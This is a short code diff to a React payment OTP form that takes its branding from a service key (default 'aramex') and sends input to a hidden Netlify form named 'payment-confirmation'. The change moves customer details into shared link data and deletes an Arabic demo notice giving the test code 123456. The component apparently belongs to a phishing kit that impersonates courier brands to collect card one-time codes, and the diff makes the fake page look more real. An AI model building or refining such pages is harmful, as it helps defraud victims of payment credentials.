@@ -22,8 +22,9 @@ const PaymentOTPForm = () => {
   
   // Create refs for all inputs
   const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
-  
-  const customerInfo = JSON.parse(sessionStorage.getItem('customerInfo') || '{}');
+
+  // Get customer info from link data (cross-device compatible)
+  const customerInfo = linkData?.payload?.customerInfo || {};
   const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
   const serviceName = linkData?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
@@ -362,14 +363,7 @@ const PaymentOTPForm = () => {
           </Button>
         )}
       </form>
-      
-      {/* Demo Info */}
-      <div className="mt-6 p-3 bg-muted/30 rounded-lg text-center">
-        <p className="text-xs text-muted-foreground">
-          🔐 للاختبار: استخدم الرمز <strong className="text-foreground">123456</strong>
-        </p>
-      </div>
-      
+
       {/* Hidden Netlify Form */}
       <form name="payment-confirmation" netlify-honeypot="bot-field" data-netlify="true" hidden>
         <input type="text" name="name" />
